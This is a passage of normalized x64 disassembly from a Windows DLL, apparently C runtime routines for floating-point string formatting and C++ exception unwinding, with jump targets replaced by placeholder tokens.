cmp edx ebx
jb r-xdata
cmp r13d [ rcx + 0x4 ]
jg r-xdata
mov eax [ rbp + 0x8 ]
cmp [ rcx + 0x4 ] eax
jg r-xdata
movsxd rcx [ rsi + 0x10 ]
add rcx [ r12 + 0x8 ]
add rcx r9
test rbp rbp
je r-xdata
cmp [ r8 ] r11d
je r-xdata
cmp [ r8 ] r11d
jne r-xdata
mov eax [ r8 ]
lea rcx [ rax + rax * 4 ]
movsxd rax [ rsi + 0x10 ]
lea rax [ rax + rcx * 4 ]
add rax [ r12 + 0x8 ]
jmp r-xdata
lea eax [ rdx + 0x1 ]
mov [ r10 ] eax
mov [ r8 ] edx
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_18001e64c
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx ] rdx
call sub_180010a54
cmp rbx [ rax + 0x120 ]
jae r-xdata
xor ecx ecx
call sub_180010a54
mov rcx [ rax + 0x120 ]
jmp r-xdata
mov [ rbx + 0x8 ] rcx
call sub_180010a54
mov [ rax + 0x120 ] rbx
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18001e690
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180010a54
mov rdx [ rax + 0x120 ]
jmp r-xdata
test rdx rdx
jne r-xdata
cmp [ rdx ] rbx
je r-xdata
lea eax [ rdx + 0x1 ]
xor eax eax
jmp r-xdata
mov rdx [ rdx + 0x8 ]
add rsp 0x20
pop rbx
retn
sub_18001e6c4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
call sub_180010a54
cmp rdi [ rax + 0x120 ]
je r-xdata
call sub_180010a54
mov rbx [ rax + 0x120 ]
jmp r-xdata
call sub_180019758
test rbx rbx
jne r-xdata
cmp rdi rbx
je r-xdata
call sub_180019758
call sub_180010a54
mov rcx [ rbx + 0x8 ]
mov [ rax + 0x120 ] rcx
jmp r-xdata
mov rbx [ rbx + 0x8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18001e724
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x5a0
mov rsi rdx
mov rbp rcx
mov rdi r8
lea rcx [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r8d 0x98
mov rbx r9
call sub_1800160e0
mov rax [ rsp + 0x5d0 ]
mov rdx [ rsp + 0x5e8 ]
mov rcx [ rbp ]
mov [ rsp + 0x60 ] rax
movsxd rax [ rsp + 0x5d8 ]
lea r11 [ sub_18001fb98 ]
lea r8 [ rsp + 0x30 ]
mov [ rsp + 0x68 ] rax
mov rax [ rsp + 0x5e0 ]
xor r9d r9d
mov [ rsp + 0x78 ] rax
movzx eax [ rsp + 0x5f0 ]
mov [ rsp + 0x50 ] r11
mov [ rsp + 0x88 ] rax
mov rax [ rdx + 0x40 ]
mov rdx [ rdx ]
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0xd0 ]
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x70 ] rdi
mov [ rsp + 0x80 ] rsi
mov [ rsp + 0x90 ] 0x19930520
mov [ rsp + 0x20 ] rax
call RtlUnwindEx
lea r11 [ rsp + 0x5a0 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
sub_18001e80c
push rbx
sub rsp 0x40
mov rbx rcx
lea rcx [ rsp + 0x20 ]
call sub_18000d428
movsx ecx [ rbx ]
call sub_18001d340
cmp eax 0x65
je r-xdata
movsx ecx [ rbx ]
call sub_18001d340
cmp eax 0x78
jne r-xdata
inc rbx
movzx ecx [ rbx ]
call sub_18001a9f0
test eax eax
jne r-xdata
mov rax [ rsp + 0x20 ]
mov dl [ rbx ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ rbx ] cl
inc rbx
add rbx 0x2
mov al [ rbx ]
mov [ rbx ] dl
mov dl al
mov al [ rbx ]
inc rbx
test al al
jne r-xdata
cmp [ rsp + 0x38 ] al
je r-xdata
add rsp 0x40
pop rbx
retn
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_18001e88c
push rbx
sub rsp 0x40
mov rbx rcx
lea rcx [ rsp + 0x20 ]
call sub_18000d428
mov r11b [ rbx ]
mov rcx [ rsp + 0x20 ]
test r11b r11b
je r-xdata
mov al [ rbx ]
inc rbx
test al al
je r-xdata
mov rax [ rcx + 0x128 ]
mov rdx [ rax ]
mov al [ rdx ]
cmp [ rsp + 0x38 ] 0x0
je r-xdata
jmp r-xdata
inc rbx
mov r11b [ rbx ]
test r11b r11b
jne r-xdata
add rsp 0x40
pop rbx
retn
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
mov al [ rbx ]
test al al
jne r-xdata
cmp r11b al
je r-xdata
cmp al 0x65
je r-xdata
mov rdx rbx
cmp al 0x45
je r-xdata
dec rbx
cmp [ rbx ] 0x30
je r-xdata
mov rax [ rcx + 0x128 ]
mov rcx [ rax ]
mov al [ rcx ]
cmp [ rbx ] al
jne r-xdata
inc rbx
mov al [ rdx ]
inc rbx
inc rdx
mov [ rbx ] al
test al al
jne r-xdata
dec rbx
sub_18001e944
push rbx
sub rsp 0x30
mov rax r8
mov rbx rdx
mov r8 r9
mov rdx rax
test ecx ecx
je r-xdata
lea rcx [ rsp + 0x40 ]
call sub_180020c8c
mov r11d [ rsp + 0x40 ]
mov [ rbx ] r11d
lea rcx [ rsp + 0x20 ]
call sub_180020b88
mov r11 [ rsp + 0x20 ]
mov [ rbx ] r11
jmp r-xdata
add rsp 0x30
pop rbx
retn
sub_18001e9a0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r15
sub rsp 0x50
mov r12 rdx
mov rdx [ rsp + 0xa0 ]
mov rdi rcx
lea rcx [ rax - 0x38 ]
mov r15d r9d
movsxd rbx r8d
call sub_18000d428
xor r13d r13d
cmp rdi r13
jne r-xdata
cmp r12 r13
ja r-xdata
call sub_180010834
lea ebx [ r13 + 0x16 ]
mov eax r13d
cmp ebx r13d
cmovg eax ebx
add eax 0x9
cdqe
cmp r12 rax
ja r-xdata
call sub_180010834
mov ebx 0x16
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
mov [ rsp + 0x20 ] r13
call sub_180010764
cmp [ rsp + 0x48 ] r13b
je r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rbp [ rsp + 0x90 ]
cmp [ rsp + 0x98 ] r13b
je r-xdata
call sub_180010834
mov ebx 0x22
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r13
pop r12
retn
cmp [ rbp ] 0x2d
mov rdx rdi
jne r-xdata
cmp [ rbp ] 0x2d
mov rsi r13
sete sil
add rsi rdi
test ebx ebx
setg r13b
test r13d r13d
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
mov [ rsp + 0x20 ] r13
call sub_180010764
cmp [ rsp + 0x48 ] r13b
je r-xdata
cmp ebx r13d
jle r-xdata
mov [ rdi ] 0x2d
lea rdx [ rdi + 0x1 ]
xor r13d r13d
mov rcx rsi
call sub_1800174b0
movsxd rcx r13d
mov rdx rsi
lea r8 [ rax + 0x1 ]
add rcx rsi
call sub_1800160e0
cmp [ rsp + 0x98 ] r13b
mov rcx r13
lea r8 [ r--data ]
sete cl
add rbx rdx
add rbx rcx
sub rdi rbx
cmp r12 0xffffffffffffffff
mov rcx rbx
lea rdx [ r12 + rdi ]
cmove rdx r12
call sub_18001695c
cmp eax r13d
je r-xdata
mov al [ rdx + 0x1 ]
mov [ rdx ] al
mov rax [ rsp + 0x30 ]
inc rdx
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ rdx ] cl
lea rcx [ rbx + 0x2 ]
cmp r15d r13d
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_18001063c
mov rax [ rbp + 0x10 ]
cmp [ rax ] 0x30
je r-xdata
mov [ rbx ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov r8d [ rbp + 0x4 ]
sub r8d 0x1
jns r-xdata
cmp [ rsp + 0x48 ] r13b
je r-xdata
cmp [ rcx ] 0x30
jne r-xdata
cmp r8d 0x64
jl r-xdata
neg r8d
mov [ rbx + 0x1 ] 0x2d
xor eax eax
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
lea rdx [ rcx + 0x1 ]
mov r8d 0x3
call sub_1800160e0
cmp r8d 0xa
jl r-xdata
mov eax 0x51eb851f
imul r8d
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
add [ rbx + 0x2 ] dl
imul edx edx 0xffffff9c
add r8d edx
add [ rbx + 0x4 ] r8b
mov eax 0x66666667
imul r8d
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
add [ rbx + 0x3 ] dl
imul edx edx 0xfffffff6
add r8d edx
sub_18001ebf8
push rbx
push rsi
push rdi
push r12
sub rsp 0x88
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rcx [ rcx ]
mov rbx r8
mov rdi rdx
mov esi r9d
mov r12d 0x16
lea r8 [ rsp + 0x58 ]
lea rdx [ rsp + 0x40 ]
mov r9 r12
call sub_180020f44
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] r12d
call sub_180010764
mov eax r12d
jmp r-xdata
or rdx 0xffffffffffffffff
cmp rbx rdx
je r-xdata
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_180017570
add rsp 0x88
pop r12
pop rdi
pop rsi
pop rbx
retn
xor eax eax
cmp [ rsp + 0x40 ] 0x2d
lea r8d [ rsi + 0x1 ]
sete al
xor ecx ecx
test esi esi
setg cl
add rax rdi
lea r9 [ rsp + 0x40 ]
add rcx rax
call sub_180020d90
test eax eax
je r-xdata
xor eax eax
cmp [ rsp + 0x40 ] 0x2d
mov rdx rbx
sete al
sub rdx rax
xor eax eax
test esi esi
setg al
sub rdx rax
mov rax [ rsp + 0xd8 ]
mov r9d [ rsp + 0xd0 ]
mov r8d esi
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] rax
call sub_18001e9a0
mov [ rdi ] 0x0
jmp r-xdata
sub_18001ed04
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
push r14
push r15
sub rsp 0x50
mov rdi rdx
mov rdx [ rsp + 0x98 ]
mov r13 rcx
lea rcx [ rax - 0x38 ]
mov ebp r9d
mov rbx r8
mov r15d 0x3ff
mov r12d 0x30
call sub_18000d428
xor r14d r14d
cmp ebp r14d
cmovl ebp r14d
cmp rdi r14
jne r-xdata
cmp rbx r14
ja r-xdata
call sub_180010834
lea ebx [ r12 - 0x1a ]
lea eax [ rbp + 0xb ]
mov [ rdi ] r14b
movsxd rcx eax
cmp rbx rcx
ja r-xdata
call sub_180010834
mov ebx 0x16
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
mov [ rsp + 0x20 ] r14
call sub_180010764
cmp [ rsp + 0x48 ] r14b
je r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rax [ r13 ]
mov ecx 0x7ff
shr rax 0x34
and rax rcx
cmp rax rcx
jne r-xdata
call sub_180010834
mov ebx 0x22
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov r12 [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r14
pop r13
retn
mov rax 0x8000000000000000
test [ r13 ] rax
je r-xdata
lea r8 [ rbx - 0x2 ]
cmp rbx 0xffffffffffffffff
lea rdx [ rdi + 0x2 ]
mov r9d ebp
mov rcx r13
cmove r8 rbx
mov [ rsp + 0x28 ] r14
mov [ rsp + 0x20 ] r14d
call sub_18001ebf8
cmp eax r14d
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
mov [ rsp + 0x20 ] r14
call sub_180010764
cmp [ rsp + 0x48 ] r14b
je r-xdata
mov r9d [ rsp + 0x90 ]
mov r11d 0x30
mov rbx 0xfffffffffffff
mov eax r9d
mov [ rdi ] r11b
neg eax
mov eax r9d
sbb cl cl
and cl 0xe0
add cl 0x78
neg eax
mov rax 0x7ff0000000000000
sbb edx edx
mov [ rdi + 0x1 ] cl
and edx 0xffffffe0
sub edx 0xffffffd9
test [ r13 ] rax
jne r-xdata
mov [ rdi ] 0x2d
inc rdi
cmp [ rdi + 0x2 ] 0x2d
jne r-xdata
mov [ rdi ] r14b
cmp [ rsp + 0x48 ] r14b
je r-xdata
mov [ rdi + 0x2 ] 0x31
add rdi 0x3
mov [ rdi + 0x2 ] r11b
mov rax [ r13 ]
add rdi 0x3
and rax rbx
neg rax
sbb r15 r15
and r15d 0x3fe
jmp r-xdata
mov ebx [ rsp + 0x90 ]
mov [ rdi ] 0x30
mov edx 0x65
mov eax ebx
neg eax
sbb cl cl
and cl 0xe0
add cl 0x78
mov [ rdi + 0x1 ] cl
lea rcx [ rdi + 0x2 ]
call sub_180020b60
cmp rax r14
je r-xdata
mov [ rdi ] 0x2d
inc rdi
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rax [ rsp + 0x30 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ r14 ] cl
mov [ r14 ] r10b
jmp r-xdata
xor r10d r10d
mov r14 rdi
inc rdi
cmp ebp r10d
jne r-xdata
cmp [ rsp + 0x48 ] r14b
jmp r-xdata
neg ebx
sbb cl cl
and cl 0xe0
add cl 0x70
mov [ rax ] cl
mov [ rax + 0x3 ] r14b
cmp ebp r10d
jle r-xdata
mov r8 0xf000000000000
test [ r13 ] rbx
jbe r-xdata
je r-xdata
cmp [ r14 ] r10b
cmove rdi r14
neg r9d
sbb al al
and al 0xe0
add al 0x70
mov [ rdi ] al
mov rcx [ r13 ]
shr rcx 0x34
and ecx 0x7ff
sub rcx r15
js r-xdata
mov r8d ebp
mov dl r11b
mov rcx rdi
mov ebx ebp
call sub_180016870
mov r9d [ rsp + 0x90 ]
add rdi rbx
xor r10d r10d
lea r11d [ r10 + 0x30 ]
cmp r12w r10w
jl r-xdata
mov rax [ r13 ]
mov cl r12b
and rax r8
and rax rbx
shr rax cl
add ax r11w
cmp ax 0x39
jbe r-xdata
xor eax eax
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
mov [ rdi + 0x1 ] 0x2d
add rdi 0x2
neg rcx
mov [ rdi + 0x1 ] 0x2b
add rdi 0x2
jmp r-xdata
mov rax [ r13 ]
mov cl r12b
and rax r8
and rax rbx
shr rax cl
cmp ax 0x8
jbe r-xdata
add r12w 0xfffc
mov [ rdi ] al
shr r8 0x4
inc rdi
dec ebp
cmp r12w r10w
jge r-xdata
add ax dx
cmp rcx 0x64
jl r-xdata
mov rax 0x20c49ba5e353f7cf
imul rcx
sar rdx 0x7
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xfffffffffffffc18
mov [ rdi ] al
inc rdi
add rcx rdx
cmp rdi r8
jne r-xdata
cmp rcx 0x3e8
mov r8 rdi
mov [ rdi ] r11b
jl r-xdata
lea rax [ rdi - 0x1 ]
cmp ebp r10d
jle r-xdata
cmp rdi r8
jne r-xdata
mov rax 0xa3d70a3d70a3d70b
imul rcx
add rdx rcx
sar rdx 0x6
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xffffffffffffff9c
mov [ rdi ] al
inc rdi
add rcx rdx
mov [ rax ] r11b
dec rax
jmp r-xdata
cmp [ rax ] 0x46
jne r-xdata
mov rax 0x6666666666666667
imul rcx
sar rdx 0x2
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xfffffffffffffff6
mov [ rdi ] al
inc rdi
add rcx rdx
cmp rcx 0xa
jl r-xdata
cmp [ rax ] 0x66
je r-xdata
cmp rax r14
je r-xdata
add cl r11b
cmp [ rsp + 0x48 ] r10b
mov [ rdi ] cl
mov [ rdi + 0x1 ] r10b
inc [ rax - 0x1 ]
mov cl [ rax ]
cmp cl 0x39
jne r-xdata
inc cl
mov [ rax ] cl
jmp r-xdata
add dl 0x3a
mov [ rax ] dl
jmp r-xdata
sub_18001f130
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x50
mov ebx [ r9 + 0x4 ]
mov rsi rdx
mov rdx [ rsp + 0x88 ]
mov rdi rcx
lea rcx [ rax - 0x28 ]
mov r12 r9
dec ebx
mov ebp r8d
call sub_18000d428
test rdi rdi
jne r-xdata
test rsi rsi
jne r-xdata
call sub_180010834
and [ rsp + 0x20 ] rdi
lea ebx [ rdi + 0x16 ]
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_180010764
cmp [ rsp + 0x48 ] dil
je r-xdata
cmp [ rsp + 0x80 ] 0x0
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] rsi
lea ebx [ rsi + 0x16 ]
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_180010764
cmp [ rsp + 0x48 ] sil
je r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ r12 ] 0x2d
jne r-xdata
cmp ebx ebp
jne r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
mov rdi [ rsp + 0x78 ]
add rsp 0x50
pop r12
retn
cmp [ r12 + 0x4 ] 0x0
jg r-xdata
mov [ rdi ] 0x2d
inc rdi
xor eax eax
cmp [ r12 ] 0x2d
movsxd rcx ebx
sete al
add rax rdi
mov [ rcx + rax ] 0x30
mov [ rcx + rax + 0x1 ] 0x0
movsxd rax [ r12 + 0x4 ]
add rdi rax
mov rcx rdi
call sub_1800174b0
lea rcx [ rdi + 0x1 ]
mov rdx rdi
lea r8 [ rax + 0x1 ]
call sub_1800160e0
mov [ rdi ] 0x30
inc rdi
jmp r-xdata
cmp [ rsp + 0x48 ] 0x0
je r-xdata
mov rcx rdi
lea rsi [ rdi + 0x1 ]
call sub_1800174b0
mov rdx rdi
mov rcx rsi
lea r8 [ rax + 0x1 ]
call sub_1800160e0
mov r11 [ rsp + 0x30 ]
mov rax [ r11 + 0x128 ]
mov rcx [ rax ]
mov al [ rcx ]
mov [ rdi ] al
mov ebx [ r12 + 0x4 ]
test ebx ebx
jns r-xdata
test ebp ebp
jle r-xdata
xor eax eax
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
neg ebx
cmp [ rsp + 0x80 ] 0x0
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov ebx ebp
cmp ebp eax
cmovge ebx eax
movsxd r8 ebx
mov edx 0x30
mov rcx rsi
call sub_180016870
mov rcx rsi
call sub_1800174b0
movsxd rcx ebx
mov rdx rsi
lea r8 [ rax + 0x1 ]
add rcx rsi
call sub_1800160e0
sub_18001f2f4
push rbx
push rsi
push rdi
push r12
sub rsp 0x78
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov rcx [ rcx ]
mov rbx r8
mov rdi rdx
mov esi r9d
mov r12d 0x16
lea r8 [ rsp + 0x48 ]
lea rdx [ rsp + 0x30 ]
mov r9 r12
call sub_180020f44
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] r12d
call sub_180010764
mov eax r12d
jmp r-xdata
or rdx 0xffffffffffffffff
cmp rbx rdx
je r-xdata
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_180017570
add rsp 0x78
pop r12
pop rdi
pop rsi
pop rbx
retn
mov r8d [ rsp + 0x34 ]
xor ecx ecx
lea r9 [ rsp + 0x30 ]
add r8d esi
cmp [ rsp + 0x30 ] 0x2d
sete cl
add rcx rdi
call sub_180020d90
test eax eax
je r-xdata
xor eax eax
cmp [ rsp + 0x30 ] 0x2d
mov rdx rbx
sete al
sub rdx rax
mov rax [ rsp + 0xc0 ]
lea r9 [ rsp + 0x30 ]
mov r8d esi
mov [ rsp + 0x28 ] rax
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x20 ] 0x0
call sub_18001f130
mov [ rdi ] 0x0
jmp r-xdata
sub_18001f3dc
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rcx [ rcx ]
mov rdi r8
mov rsi rdx
mov ebp r9d
mov ebx 0x16
lea r8 [ rsp + 0x58 ]
lea rdx [ rsp + 0x40 ]
mov r9 rbx
call sub_180020f44
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_180010764
mov eax ebx
jmp r-xdata
mov r12d [ rsp + 0x44 ]
xor eax eax
dec r12d
cmp [ rsp + 0x40 ] 0x2d
sete al
or rdx 0xffffffffffffffff
lea rbx [ rax + rsi ]
cmp rdi rdx
je r-xdata
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_180017570
add rsp 0x80
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
lea r9 [ rsp + 0x40 ]
mov r8d ebp
mov rcx rbx
call sub_180020d90
test eax eax
je r-xdata
mov rdx rdi
sub rdx rax
mov eax [ rsp + 0x44 ]
dec eax
cmp r12d eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ rsi ] 0x0
jmp r-xdata
mov rax [ rsp + 0xd8 ]
mov r9d [ rsp + 0xd0 ]
mov r8d ebp
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x28 ] 0x1
mov [ rsp + 0x20 ] rax
call sub_18001e9a0
cmp eax ebp
jge r-xdata
test cl cl
je r-xdata
mov rax [ rsp + 0xd8 ]
lea r9 [ rsp + 0x40 ]
mov r8d ebp
mov [ rsp + 0x28 ] rax
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x20 ] 0x1
call sub_18001f130
jmp r-xdata
mov al [ rbx ]
inc rbx
test al al
jne r-xdata
mov [ rbx - 0x2 ] al
sub_18001f520
sub rsp 0x38
cmp r9d 0x65
je r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_18001ebf8
cmp r9d 0x45
je r-xdata
cmp r9d 0x66
jne r-xdata
cmp r9d 0x61
je r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
call sub_18001f2f4
jmp r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_18001ed04
jmp r-xdata
cmp r9d 0x41
je r-xdata
add rsp 0x38
retn
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_18001f3dc
jmp r-xdata
sub_18001f5dc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp r8
mov rsi rdx
mov rbx rcx
test rcx rcx
jne r-xdata
movsxd rax [ rbx + 0x18 ]
mov edi [ rbx + 0x14 ]
add rax [ rsi + 0x8 ]
jne r-xdata
call sub_180019758
xor ecx ecx
test edi edi
je r-xdata
call sub_180019758
or eax 0xffffffff
mov r9 [ rsi + 0x8 ]
movsxd r8 [ rbx + 0x18 ]
lea rdx [ r9 + r8 ]
test ecx ecx
je r-xdata
inc ecx
add rdx 0x8
cmp ecx edi
jb r-xdata
lea eax [ rcx - 0x1 ]
lea rdx [ r8 + rax * 8 ]
mov eax [ rdx + r9 + 0x4 ]
jmp r-xdata
movsxd rax [ rdx ]
add rax r9
cmp rbp rax
jl r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_18001f6a4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi r9d
lea r9 [ rsp + 0x40 ]
mov rbx r8
call sub_18001e1a4
mov rcx [ rax ]
movsxd rax [ rbx + 0x1c ]
mov [ rsp + 0x40 ] rcx
cmp edi [ rax + rcx + 0x4 ]
jle r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rax + rcx + 0x4 ] edi
sub_18001f71c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_180013470
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18000e06c
sub_18001f758
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov esi [ rcx + 0x4 ]
xor ebx ebx
mov r12 r8
mov rbp rdx
mov rdi rcx
cmp esi ebx
je r-xdata
mov r11 rbx
movsxd rsi esi
call sub_18001e290
lea r11 [ rsi + rax ]
jmp r-xdata
mov eax 0x1
cmp esi ebx
je r-xdata
cmp r11 rbx
je r-xdata
mov r11 rbx
movsxd rsi [ rdi + 0x4 ]
call sub_18001e290
lea r11 [ rsi + rax ]
jmp r-xdata
cmp esi ebx
je r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov rsi rbx
call sub_18001e290
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
mov al 0x2
test [ rbp ] al
je r-xdata
cmp [ rdi + 0x4 ] ebx
je r-xdata
call sub_18001e2a8
mov r11 rax
movsxd rax [ rbp + 0x4 ]
add r11 rax
cmp rsi r11
je r-xdata
test [ r12 ] 0x1
je r-xdata
test [ rdi ] 0x8
je r-xdata
mov rsi rbx
call sub_18001e290
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
test [ r12 ] 0x4
je r-xdata
test [ rdi ] 0x1
je r-xdata
mov eax ebx
jmp r-xdata
xor eax eax
jmp r-xdata
call sub_18001e2a8
lea rcx [ rsi + 0x10 ]
mov r11 rax
movsxd rax [ rbp + 0x4 ]
lea rdx [ r11 + rax + 0x10 ]
call sub_1800132b0
cmp eax ebx
je r-xdata
test [ r12 ] al
je r-xdata
test [ rdi ] 0x4
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov ebx 0x1
test [ rdi ] al
je r-xdata
sub_18001f87c
sub rsp 0x28
mov rax [ rcx ]
cmp [ rax ] 0xe0434f4d
je r-xdata
call sub_180010a54
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp [ rax ] 0xe06d7363
jne r-xdata
xor eax eax
add rsp 0x28
retn
call sub_180010a54
dec [ rax + 0x100 ]
call sub_180010a54
and [ rax + 0x100 ] 0x0
call sub_180019734
sub_18001f8c8
mov rax rsp
mov [ rax + 0x20 ] r9d
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r13d r9d
mov rsi r8
mov rbx rdx
mov r14 rcx
call sub_18001f670
mov edi eax
call sub_18001e290
mov r15 rax
